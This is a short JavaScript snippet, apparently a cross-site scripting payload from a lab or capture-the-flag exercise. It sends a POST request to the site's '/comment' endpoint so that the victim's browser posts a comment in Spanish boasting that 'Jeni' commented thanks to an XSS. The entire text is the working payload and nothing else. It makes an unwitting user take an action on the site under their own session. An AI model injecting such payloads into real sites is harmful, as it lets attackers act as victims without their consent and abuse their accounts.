fetch('/comment', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'content=Mision cumplida, Jeni ha comentado gracias a un XSS.'
});
